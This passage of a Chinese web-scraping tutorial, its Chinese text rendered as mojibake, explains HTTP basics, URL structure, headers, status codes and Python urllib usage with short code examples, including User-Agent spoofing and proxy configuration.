getContent(html)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> content <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="comment"># ç”Ÿæˆæ–‡ä»¶å</span></span><br><span class="line">                fileName = <span class="built_in">str</span>(cnt) + <span class="string">&quot;.txt&quot;</span></span><br><span class="line">                saveFile(content, path, fileName)</span><br><span class="line">                cnt += <span class="number">1</span></span><br><span class="line">        var -= <span class="number">11</span></span><br><span class="line">    <span class="keyword">return</span> cnt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    cnt = download_article()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;all done!\n&quot;</span> + <span class="built_in">str</span>(cnt))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="åŸºç¡€çŸ¥è¯†ï¼šhttpåè®®ä¸url"><a href="#åŸºç¡€çŸ¥è¯†ï¼šhttpåè®®ä¸url" class="headerlink" title="åŸºç¡€çŸ¥è¯†ï¼šhttpåè®®ä¸url"></a>åŸºç¡€çŸ¥è¯†ï¼šhttpåè®®ä¸url</h1><h2 id="ä»€ä¹ˆæ˜¯httpå’Œhttpsåè®®ï¼š"><a href="#ä»€ä¹ˆæ˜¯httpå’Œhttpsåè®®ï¼š" class="headerlink" title="ä»€ä¹ˆæ˜¯httpå’Œhttpsåè®®ï¼š"></a>ä»€ä¹ˆæ˜¯httpå’Œhttpsåè®®ï¼š</h2><p>HTTPåè®®ï¼šå…¨ç§°æ˜¯<code>HyperText Transfer Protocol</code>ï¼Œä¸­æ–‡æ„æ€æ˜¯è¶…æ–‡æœ¬ä¼ è¾“åè®®ï¼Œæ˜¯ä¸€ç§å‘å¸ƒå’Œæ¥æ”¶HTMLé¡µé¢çš„æ–¹æ³•ã€‚æœåŠ¡å™¨ç«¯å£å·æ˜¯<code>80</code>ç«¯å£ã€‚<br>HTTPSåè®®ï¼šæ˜¯HTTPåè®®çš„åŠ å¯†ç‰ˆæœ¬ï¼Œåœ¨HTTPä¸‹åŠ å…¥äº†SSLå±‚ã€‚æœåŠ¡å™¨ç«¯å£å·æ˜¯<code>443</code>ç«¯å£ã€‚</p><p>åœ¨æµè§ˆå™¨ä¸­å‘é€ä¸€ä¸ªhttpè¯·æ±‚çš„è¿‡ç¨‹ï¼š</p><ol><li>å½“ç”¨æˆ·åœ¨æµè§ˆå™¨çš„åœ°å€æ ä¸­è¾“å…¥ä¸€ä¸ªURLå¹¶æŒ‰å›è½¦é”®ä¹‹åï¼Œæµè§ˆå™¨ä¼šå‘HTTPæœåŠ¡å™¨å‘é€HTTPè¯·æ±‚ã€‚HTTPè¯·æ±‚ä¸»è¦åˆ†ä¸ºâ€œGetâ€å’Œâ€œPostâ€ä¸¤ç§æ–¹æ³•ã€‚</li><li>å½“æˆ‘ä»¬åœ¨æµè§ˆå™¨è¾“å…¥URL <a href="http://www.baidu.com">http://www.baidu.com</a> çš„æ—¶å€™ï¼Œæµè§ˆå™¨å‘é€ä¸€ä¸ªRequestè¯·æ±‚å»è·å– <a href="http://www.baidu.com">http://www.baidu.com</a> çš„htmlæ–‡ä»¶ï¼ŒæœåŠ¡å™¨æŠŠResponseæ–‡ä»¶å¯¹è±¡å‘é€å›ç»™æµè§ˆå™¨ã€‚</li><li>æµè§ˆå™¨åˆ†æResponseä¸­çš„ HTMLï¼Œå‘ç°å…¶ä¸­å¼•ç”¨äº†å¾ˆå¤šå…¶ä»–æ–‡ä»¶ï¼Œæ¯”å¦‚Imagesæ–‡ä»¶ï¼ŒCSSæ–‡ä»¶ï¼ŒJSæ–‡ä»¶ã€‚ æµè§ˆå™¨ä¼šè‡ªåŠ¨å†æ¬¡å‘é€Requestå»è·å–å›¾ç‰‡ï¼ŒCSSæ–‡ä»¶ï¼Œæˆ–è€…JSæ–‡ä»¶ã€‚</li><li>å½“æ‰€æœ‰çš„æ–‡ä»¶éƒ½ä¸‹è½½æˆåŠŸåï¼Œç½‘é¡µä¼šæ ¹æ®HTMLè¯­æ³•ç»“æ„ï¼Œå®Œæ•´çš„æ˜¾ç¤ºå‡ºæ¥äº†ã€‚</li></ol><h2 id="urlè¯¦è§£ï¼š"><a href="#urlè¯¦è§£ï¼š" class="headerlink" title="urlè¯¦è§£ï¼š"></a>urlè¯¦è§£ï¼š</h2><p><code>URL</code>æ˜¯<code>Uniform Resource Locator</code>çš„ç®€å†™ï¼Œç»Ÿä¸€èµ„æºå®šä½ç¬¦ã€‚<br>ä¸€ä¸ª<code>URL</code>ç”±ä»¥ä¸‹å‡ éƒ¨åˆ†ç»„æˆï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scheme://host:port/path/?query-string=xxx#anchor</span><br></pre></td></tr></table></figure><ul><li><strong>scheme</strong>ï¼šä»£è¡¨çš„æ˜¯è®¿é—®çš„åè®®ï¼Œä¸€èˆ¬ä¸º<code>http</code>æˆ–è€…<code>https</code>ä»¥åŠ<code>ftp</code>ç­‰ã€‚</li><li><strong>host</strong>ï¼šä¸»æœºåï¼ŒåŸŸåï¼Œæ¯”å¦‚<code>www.baidu.com</code>ã€‚</li><li><strong>port</strong>ï¼šç«¯å£å·ã€‚å½“ä½ è®¿é—®ä¸€ä¸ªç½‘ç«™çš„æ—¶å€™ï¼Œæµè§ˆå™¨é»˜è®¤ä½¿ç”¨80ç«¯å£ã€‚</li><li><strong>path</strong>ï¼šæŸ¥æ‰¾è·¯å¾„ã€‚æ¯”å¦‚ï¼š<code>www.jianshu.com/trending/now</code>ï¼Œåé¢çš„<code>trending/now</code>å°±æ˜¯<code>path</code>ã€‚</li><li><strong>query-string</strong>ï¼šæŸ¥è¯¢å­—ç¬¦ä¸²ï¼Œæ¯”å¦‚ï¼š<code>www.baidu.com/s?wd=python</code>ï¼Œåé¢çš„<code>wd=python</code>å°±æ˜¯æŸ¥è¯¢å­—ç¬¦ä¸²ã€‚</li><li><strong>anchor</strong>ï¼šé”šç‚¹ï¼Œåå°ä¸€èˆ¬ä¸ç”¨ç®¡ï¼Œå‰ç«¯ç”¨æ¥åšé¡µé¢å®šä½çš„ã€‚</li></ul><p>==åœ¨æµè§ˆå™¨ä¸­è¯·æ±‚ä¸€ä¸ª<code>url</code>ï¼Œæµè§ˆå™¨ä¼šå¯¹è¿™ä¸ªurlè¿›è¡Œä¸€ä¸ªç¼–ç ã€‚é™¤è‹±æ–‡å­—æ¯ï¼Œæ•°å­—å’Œéƒ¨åˆ†ç¬¦å·å¤–ï¼Œå…¶ä»–çš„å…¨éƒ¨ä½¿ç”¨ç™¾åˆ†å·+åå…­è¿›åˆ¶ç å€¼è¿›è¡Œç¼–ç ã€‚==</p><h2 id="å¸¸ç”¨çš„è¯·æ±‚æ–¹æ³•ï¼š"><a href="#å¸¸ç”¨çš„è¯·æ±‚æ–¹æ³•ï¼š" class="headerlink" title="å¸¸ç”¨çš„è¯·æ±‚æ–¹æ³•ï¼š"></a>å¸¸ç”¨çš„è¯·æ±‚æ–¹æ³•ï¼š</h2><p>åœ¨<code>Http</code>åè®®ä¸­ï¼Œå®šä¹‰äº†å…«ç§è¯·æ±‚æ–¹æ³•ã€‚è¿™é‡Œä»‹ç»ä¸¤ç§å¸¸ç”¨çš„è¯·æ±‚æ–¹æ³•ï¼Œåˆ†åˆ«æ˜¯<code>get</code>è¯·æ±‚å’Œ<code>post</code>è¯·æ±‚ã€‚</p><ol><li><code>get</code>è¯·æ±‚ï¼šä¸€èˆ¬æƒ…å†µä¸‹ï¼Œåªä»æœåŠ¡å™¨è·å–æ•°æ®ä¸‹æ¥ï¼Œå¹¶ä¸ä¼šå¯¹æœåŠ¡å™¨èµ„æºäº§ç”Ÿä»»ä½•å½±å“çš„æ—¶å€™ä¼šä½¿ç”¨<code>get</code>è¯·æ±‚ã€‚</li><li><code>post</code>è¯·æ±‚ï¼šå‘æœåŠ¡å™¨å‘é€æ•°æ®ï¼ˆç™»å½•ï¼‰ã€ä¸Šä¼ æ–‡ä»¶ç­‰ï¼Œä¼šå¯¹æœåŠ¡å™¨èµ„æºäº§ç”Ÿå½±å“çš„æ—¶å€™ä¼šä½¿ç”¨<code>post</code>è¯·æ±‚ã€‚<br>ä»¥ä¸Šæ˜¯åœ¨ç½‘ç«™å¼€å‘ä¸­å¸¸ç”¨çš„ä¸¤ç§æ–¹æ³•ã€‚å¹¶ä¸”ä¸€èˆ¬æƒ…å†µä¸‹éƒ½ä¼šéµå¾ªä½¿ç”¨çš„åŸåˆ™ã€‚ä½†æ˜¯æœ‰çš„ç½‘ç«™å’ŒæœåŠ¡å™¨ä¸ºäº†åšåçˆ¬è™«æœºåˆ¶ï¼Œä¹Ÿç»å¸¸ä¼šä¸æŒ‰å¸¸ç†å‡ºç‰Œï¼Œæœ‰å¯èƒ½ä¸€ä¸ªåº”è¯¥ä½¿ç”¨<code>get</code>æ–¹æ³•çš„è¯·æ±‚å°±ä¸€å®šè¦æ”¹æˆ<code>post</code>è¯·æ±‚ï¼Œè¿™ä¸ªè¦è§†æƒ…å†µè€Œå®šã€‚</li></ol><h2 id="è¯·æ±‚å¤´å¸¸è§å‚æ•°ï¼š"><a href="#è¯·æ±‚å¤´å¸¸è§å‚æ•°ï¼š" class="headerlink" title="è¯·æ±‚å¤´å¸¸è§å‚æ•°ï¼š"></a>è¯·æ±‚å¤´å¸¸è§å‚æ•°ï¼š</h2><p>åœ¨<code>http</code>åè®®ä¸­ï¼Œå‘æœåŠ¡å™¨å‘é€ä¸€ä¸ªè¯·æ±‚ï¼Œæ•°æ®åˆ†ä¸ºä¸‰éƒ¨åˆ†ï¼Œç¬¬ä¸€ä¸ªæ˜¯æŠŠæ•°æ®æ”¾åœ¨urlä¸­ï¼Œç¬¬äºŒä¸ªæ˜¯æŠŠæ•°æ®æ”¾åœ¨<code>body</code>ä¸­ï¼ˆåœ¨<code>post</code>è¯·æ±‚ä¸­ï¼‰ï¼Œç¬¬ä¸‰ä¸ªå°±æ˜¯æŠŠæ•°æ®æ”¾åœ¨<code>head</code>ä¸­ã€‚è¿™é‡Œä»‹ç»åœ¨ç½‘ç»œçˆ¬è™«ä¸­ç»å¸¸ä¼šç”¨åˆ°çš„ä¸€äº›è¯·æ±‚å¤´å‚æ•°ï¼š</p><ol><li><code>User-Agent</code>ï¼šæµè§ˆå™¨åç§°ã€‚è¿™ä¸ªåœ¨ç½‘ç»œçˆ¬è™«ä¸­ç»å¸¸ä¼šè¢«ä½¿ç”¨åˆ°ã€‚è¯·æ±‚ä¸€ä¸ªç½‘é¡µçš„æ—¶å€™ï¼ŒæœåŠ¡å™¨é€šè¿‡è¿™ä¸ªå‚æ•°å°±å¯ä»¥çŸ¥é“è¿™ä¸ªè¯·æ±‚æ˜¯ç”±å“ªç§æµè§ˆå™¨å‘é€çš„ã€‚å¦‚æœæˆ‘ä»¬æ˜¯é€šè¿‡çˆ¬è™«å‘é€è¯·æ±‚ï¼Œé‚£ä¹ˆæˆ‘ä»¬çš„<code>User-Agent</code>å°±æ˜¯<code>Python</code>ï¼Œè¿™å¯¹äºé‚£äº›æœ‰åçˆ¬è™«æœºåˆ¶çš„ç½‘ç«™æ¥è¯´ï¼Œå¯ä»¥è½»æ˜“çš„åˆ¤æ–­ä½ è¿™ä¸ªè¯·æ±‚æ˜¯çˆ¬è™«ã€‚å› æ­¤æˆ‘ä»¬è¦ç»å¸¸è®¾ç½®è¿™ä¸ªå€¼ä¸ºä¸€äº›æµè§ˆå™¨çš„å€¼ï¼Œæ¥ä¼ªè£…æˆ‘ä»¬çš„çˆ¬è™«ã€‚</li><li><code>Referer</code>ï¼šè¡¨æ˜å½“å‰è¿™ä¸ªè¯·æ±‚æ˜¯ä»å“ªä¸ª<code>url</code>è¿‡æ¥çš„ã€‚è¿™ä¸ªä¸€èˆ¬ä¹Ÿå¯ä»¥ç”¨æ¥åšåçˆ¬è™«æŠ€æœ¯ã€‚å¦‚æœä¸æ˜¯ä»æŒ‡å®šé¡µé¢è¿‡æ¥çš„ï¼Œé‚£ä¹ˆå°±ä¸åšç›¸å…³çš„å“åº”ã€‚</li><li><code>Cookie</code>ï¼š<code>http</code>åè®®æ˜¯æ— çŠ¶æ€çš„ã€‚ä¹Ÿå°±æ˜¯åŒä¸€ä¸ªäººå‘é€äº†ä¸¤æ¬¡è¯·æ±‚ï¼ŒæœåŠ¡å™¨æ²¡æœ‰èƒ½åŠ›çŸ¥é“è¿™ä¸¤ä¸ªè¯·æ±‚æ˜¯å¦æ¥è‡ªåŒä¸€ä¸ªäººã€‚å› æ­¤è¿™æ—¶å€™å°±ç”¨<code>cookie</code>æ¥åšæ ‡è¯†ã€‚ä¸€èˆ¬å¦‚æœæƒ³è¦åšç™»å½•åæ‰èƒ½è®¿é—®çš„ç½‘ç«™ï¼Œé‚£ä¹ˆå°±éœ€è¦å‘é€<code>cookie</code>ä¿¡æ¯äº†ã€‚</li></ol><h2 id="å¸¸è§å“åº”çŠ¶æ€ç ï¼š"><a href="#å¸¸è§å“åº”çŠ¶æ€ç ï¼š" class="headerlink" title="å¸¸è§å“åº”çŠ¶æ€ç ï¼š"></a>å¸¸è§å“åº”çŠ¶æ€ç ï¼š</h2><ol><li><code>200</code>ï¼šè¯·æ±‚æ­£å¸¸ï¼ŒæœåŠ¡å™¨æ­£å¸¸çš„è¿”å›æ•°æ®ã€‚</li><li><code>301</code>ï¼šæ°¸ä¹…é‡å®šå‘ã€‚æ¯”å¦‚åœ¨è®¿é—®<code>www.jingdong.com</code>çš„æ—¶å€™ä¼šé‡å®šå‘åˆ°<code>www.jd.com</code>ã€‚</li><li><code>302</code>ï¼šä¸´æ—¶é‡å®šå‘ã€‚æ¯”å¦‚åœ¨è®¿é—®ä¸€ä¸ªéœ€è¦ç™»å½•çš„é¡µé¢çš„æ—¶å€™ï¼Œè€Œæ­¤æ—¶æ²¡æœ‰ç™»å½•ï¼Œé‚£ä¹ˆå°±ä¼šé‡å®šå‘åˆ°ç™»å½•é¡µé¢ã€‚</li><li><code>400</code>ï¼šè¯·æ±‚çš„<code>url</code>åœ¨æœåŠ¡å™¨ä¸Šæ‰¾ä¸åˆ°ã€‚æ¢å¥è¯è¯´å°±æ˜¯è¯·æ±‚<code>url</code>é”™è¯¯ã€‚</li><li><code>403</code>ï¼šæœåŠ¡å™¨æ‹’ç»è®¿é—®ï¼Œæƒé™ä¸å¤Ÿã€‚</li><li><code>500</code>ï¼šæœåŠ¡å™¨å†…éƒ¨é”™è¯¯ã€‚å¯èƒ½æ˜¯æœåŠ¡å™¨å‡ºç°<code>bug</code>äº†ã€‚</li></ol><h1 id="urllibåº“"><a href="#urllibåº“" class="headerlink" title="urllibåº“"></a>urllibåº“</h1><p><code>urllib</code>åº“æ˜¯<code>Python</code>ä¸­ä¸€ä¸ªæœ€åŸºæœ¬çš„ç½‘ç»œè¯·æ±‚åº“ã€‚å¯ä»¥æ¨¡æ‹Ÿæµè§ˆå™¨çš„è¡Œä¸ºï¼Œå‘æŒ‡å®šçš„æœåŠ¡å™¨å‘é€ä¸€ä¸ªè¯·æ±‚ï¼Œå¹¶å¯ä»¥ä¿å­˜æœåŠ¡å™¨è¿”å›çš„æ•°æ®ã€‚</p><h2 id="urlopenå‡½æ•°ï¼š"><a href="#urlopenå‡½æ•°ï¼š" class="headerlink" title="urlopenå‡½æ•°ï¼š"></a>urlopenå‡½æ•°ï¼š</h2><p>åœ¨<code>Python3</code>çš„<code>urllib</code>åº“ä¸­ï¼Œæ‰€æœ‰å’Œç½‘ç»œè¯·æ±‚ç›¸å…³çš„æ–¹æ³•ï¼Œéƒ½è¢«é›†åˆ°<code>urllib.request</code>æ¨¡å—ä¸‹é¢äº†ï¼Œä»¥å…ˆæ¥çœ‹ä¸‹<code>urlopen</code>å‡½æ•°åŸºæœ¬çš„ä½¿ç”¨ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line">resp = request.urlopen(<span class="string">&#x27;http://www.baidu.com&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(resp.read())</span><br></pre></td></tr></table></figure><p>å®é™…ä¸Šï¼Œä½¿ç”¨æµè§ˆå™¨è®¿é—®ç™¾åº¦ï¼Œå³é”®æŸ¥çœ‹æºä»£ç ã€‚ä½ ä¼šå‘ç°ï¼Œè·Ÿæˆ‘ä»¬åˆšæ‰æ‰“å°å‡ºæ¥çš„æ•°æ®æ˜¯ä¸€æ¨¡ä¸€æ ·çš„ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸Šé¢çš„ä¸‰è¡Œä»£ç å°±å·²ç»å¸®æˆ‘ä»¬æŠŠç™¾åº¦çš„é¦–é¡µçš„å…¨éƒ¨ä»£ç çˆ¬ä¸‹æ¥äº†ã€‚ä¸€ä¸ªåŸºæœ¬çš„urlè¯·æ±‚å¯¹åº”çš„pythonä»£ç çœŸçš„éå¸¸ç®€å•ã€‚<br>ä»¥ä¸‹å¯¹<code>urlopen</code>å‡½æ•°çš„è¿›è¡Œè¯¦ç»†è®²è§£ï¼š  </p><ol><li><code>url</code>ï¼šè¯·æ±‚çš„urlã€‚  </li><li><code>data</code>ï¼šè¯·æ±‚çš„<code>data</code>ï¼Œå¦‚æœè®¾ç½®äº†è¿™ä¸ªå€¼ï¼Œé‚£ä¹ˆå°†å˜æˆ<code>post</code>è¯·æ±‚ã€‚  </li><li>è¿”å›å€¼ï¼šè¿”å›å€¼æ˜¯ä¸€ä¸ª<code>http.client.HTTPResponse</code>å¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡æ˜¯ä¸€ä¸ªç±»æ–‡ä»¶å¥æŸ„å¯¹è±¡ã€‚æœ‰<code>read(size)</code>ã€<code>readline</code>ã€<code>readlines</code>ä»¥åŠ<code>getcode</code>ç­‰æ–¹æ³•ã€‚</li></ol><h2 id="urlretrieveå‡½æ•°ï¼š"><a href="#urlretrieveå‡½æ•°ï¼š" class="headerlink" title="urlretrieveå‡½æ•°ï¼š"></a>urlretrieveå‡½æ•°ï¼š</h2><p>è¿™ä¸ªå‡½æ•°å¯ä»¥æ–¹ä¾¿çš„å°†ç½‘é¡µä¸Šçš„ä¸€ä¸ªæ–‡ä»¶ä¿å­˜åˆ°æœ¬åœ°ã€‚ä»¥ä¸‹ä»£ç å¯ä»¥éå¸¸æ–¹ä¾¿çš„å°†ç™¾åº¦çš„é¦–é¡µä¸‹è½½åˆ°æœ¬åœ°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line">request.urlretrieve(<span class="string">&#x27;http://www.baidu.com/&#x27;</span>,<span class="string">&#x27;baidu.html&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="urlencodeå‡½æ•°ï¼š"><a href="#urlencodeå‡½æ•°ï¼š" class="headerlink" title="urlencodeå‡½æ•°ï¼š"></a>urlencodeå‡½æ•°ï¼š</h2><p>ç”¨æµè§ˆå™¨å‘é€è¯·æ±‚çš„æ—¶å€™ï¼Œ==å¦‚æœurlä¸­åŒ…å«äº†ä¸­æ–‡æˆ–è€…å…¶ä»–ç‰¹æ®Šå­—ç¬¦==ï¼Œé‚£ä¹ˆæµè§ˆå™¨ä¼šè‡ªåŠ¨çš„ç»™æˆ‘ä»¬è¿›è¡Œç¼–ç ã€‚è€Œå¦‚æœä½¿ç”¨ä»£ç å‘é€è¯·æ±‚ï¼Œé‚£ä¹ˆå°±å¿…é¡»æ‰‹åŠ¨çš„è¿›è¡Œç¼–ç ï¼Œè¿™æ—¶å€™å°±åº”è¯¥ä½¿ç”¨<code>urlencode</code>å‡½æ•°æ¥å®ç°ã€‚<code>urlencode</code>å¯ä»¥æŠŠå­—å…¸æ•°æ®è½¬æ¢ä¸º<code>URL</code>ç¼–ç çš„æ•°æ®ã€‚ç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line">data = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;çˆ¬è™«åŸºç¡€&#x27;</span>,<span class="string">&#x27;greet&#x27;</span>:<span class="string">&#x27;hello world&#x27;</span>,<span class="string">&#x27;age&#x27;</span>:<span class="number">100</span>&#125;</span><br><span class="line">qs = parse.urlencode(data)</span><br><span class="line"><span class="built_in">print</span>(qs)</span><br></pre></td></tr></table></figure><h2 id="parse-qså‡½æ•°ï¼š"><a href="#parse-qså‡½æ•°ï¼š" class="headerlink" title="parse_qså‡½æ•°ï¼š"></a>parse_qså‡½æ•°ï¼š</h2><p>å¯ä»¥å°†ç»è¿‡ç¼–ç åçš„urlå‚æ•°è¿›è¡Œè§£ç ã€‚ç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line">qs = <span class="string">&quot;name=%E7%88%AC%E8%99%AB%E5%9F%BA%E7%A1%80&amp;greet=hello+world&amp;age=100&quot;</span></span><br><span class="line"><span class="built_in">print</span>(parse.parse_qs(qs))</span><br></pre></td></tr></table></figure><h2 id="urlparseå’Œurlsplitï¼š"><a href="#urlparseå’Œurlsplitï¼š" class="headerlink" title="urlparseå’Œurlsplitï¼š"></a>urlparseå’Œurlsplitï¼š</h2><p>æœ‰æ—¶å€™æ‹¿åˆ°ä¸€ä¸ªurlï¼Œæƒ³è¦å¯¹è¿™ä¸ªurlä¸­çš„å„ä¸ªç»„æˆéƒ¨åˆ†è¿›è¡Œåˆ†å‰²ï¼Œé‚£ä¹ˆè¿™æ—¶å€™å°±å¯ä»¥ä½¿ç”¨<code>urlparse</code>æˆ–è€…æ˜¯<code>urlsplit</code>æ¥è¿›è¡Œåˆ†å‰²ã€‚ç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request,parse</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://www.baidu.com/s?username=zhiliao&#x27;</span></span><br><span class="line"></span><br><span class="line">result = parse.urlsplit(url)</span><br><span class="line"><span class="comment"># result = parse.urlparse(url)</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;scheme:&#x27;</span>,result.scheme)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;netloc:&#x27;</span>,result.netloc)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;path:&#x27;</span>,result.path)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;query:&#x27;</span>,result.query)</span><br></pre></td></tr></table></figure><p><code>urlparse</code>å’Œ<code>urlsplit</code>åŸºæœ¬ä¸Šæ˜¯ä¸€æ¨¡ä¸€æ ·çš„ã€‚==å”¯ä¸€ä¸ä¸€æ ·çš„åœ°æ–¹æ˜¯ï¼Œ<code>urlparse</code>é‡Œé¢å¤šäº†ä¸€ä¸ª<code>params</code>å±æ€§ï¼Œè€Œ<code>urlsplit</code>æ²¡æœ‰è¿™ä¸ª<code>params</code>å±æ€§==ã€‚æ¯”å¦‚æœ‰ä¸€ä¸ª<code>url</code>ä¸ºï¼š<code>url = &#39;http://www.baidu.com/s;hello?wd=python&amp;username=abc#1&#39;</code>ï¼Œé‚£ä¹ˆ<code>urlparse</code>å¯ä»¥è·å–åˆ°<code>hello</code>ï¼Œè€Œ<code>urlsplit</code>ä¸å¯ä»¥è·å–åˆ°ã€‚<code>url</code>ä¸­çš„<code>params</code>ä¹Ÿç”¨å¾—æ¯”è¾ƒå°‘ã€‚</p><h2 id="request-Requestç±»ï¼š"><a href="#request-Requestç±»ï¼š" class="headerlink" title="request.Requestç±»ï¼š"></a>request.Requestç±»ï¼š</h2><p>å¦‚æœæƒ³è¦åœ¨è¯·æ±‚çš„æ—¶å€™å¢åŠ ä¸€äº›è¯·æ±‚å¤´ï¼Œé‚£ä¹ˆå°±å¿…é¡»ä½¿ç”¨<code>request.Request</code>ç±»æ¥å®ç°ã€‚æ¯”å¦‚è¦å¢åŠ ä¸€ä¸ª<code>User-Agent</code>ï¼Œç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">req = request.Request(<span class="string">&quot;http://www.baidu.com/&quot;</span>,headers=headers)</span><br><span class="line">resp = request.urlopen(req)</span><br><span class="line"><span class="built_in">print</span>(resp.read())</span><br></pre></td></tr></table></figure><h2 id="ProxyHandlerå¤„ç†å™¨ï¼ˆä»£ç†è®¾ç½®ï¼‰"><a href="#ProxyHandlerå¤„ç†å™¨ï¼ˆä»£ç†è®¾ç½®ï¼‰" class="headerlink" title="ProxyHandlerå¤„ç†å™¨ï¼ˆä»£ç†è®¾ç½®ï¼‰"></a>ProxyHandlerå¤„ç†å™¨ï¼ˆä»£ç†è®¾ç½®ï¼‰</h2><p>å¾ˆå¤šç½‘ç«™ä¼šæ£€æµ‹æŸä¸€æ®µæ—¶é—´æŸä¸ªIPçš„è®¿é—®æ¬¡æ•°(é€šè¿‡æµé‡ç»Ÿè®¡ï¼Œç³»ç»Ÿæ—¥å¿—ç­‰)ï¼Œå¦‚æœè®¿é—®æ¬¡æ•°å¤šçš„ä¸åƒæ­£å¸¸äººï¼Œå®ƒä¼šç¦æ­¢è¿™ä¸ªIPçš„è®¿é—®ã€‚<br>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥è®¾ç½®ä¸€äº›ä»£ç†æœåŠ¡å™¨ï¼Œæ¯éš”ä¸€æ®µæ—¶é—´æ¢ä¸€ä¸ªä»£ç†ï¼Œå°±ç®—IPè¢«ç¦æ­¢ï¼Œä¾ç„¶å¯ä»¥æ¢ä¸ªIPç»§ç»­çˆ¬å–ã€‚<br>urllibä¸­é€šè¿‡ProxyHandleræ¥è®¾ç½®ä½¿ç”¨ä»£ç†æœåŠ¡å™¨ï¼Œä¸‹é¢ä»£ç è¯´æ˜å¦‚ä½•ä½¿ç”¨è‡ªå®šä¹‰openeræ¥ä½¿ç”¨ä»£ç†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿™ä¸ªæ˜¯æ²¡æœ‰ä½¿ç”¨ä»£ç†çš„</span></span><br><span class="line"><span class="comment"># resp = request.urlopen(&#x27;http://httpbin.org/get&#x27;)</span></span><br><span class="line"><span class="comment"># print(resp.read().decode(&quot;utf-8&quot;))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿™ä¸ªæ˜¯ä½¿ç”¨äº†ä»£ç†çš„</span></span><br><span class="line">handler = request.ProxyHandler(&#123;<span class="string">&quot;http&quot;</span>:<span class="string">&quot;218.66.161.88:31769&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">opener = request.build_opener(handler)</span><br><span class="line">req = request.Request(<span class="string">&quot;http://httpbin.org/ip&quot;</span>)</span><br><span class="line">resp = opener.<span class="built_in">open</span>(req)</span><br><span class="line"><span class="built_in">print</span>(resp.read())</span><br></pre></td></tr></table></figure><h2 id="â€œç§‘å­¦ä¸Šç½‘â€ä»£ç†"><a href="#â€œç§‘å­¦ä¸Šç½‘â€ä»£ç†" class="headerlink" 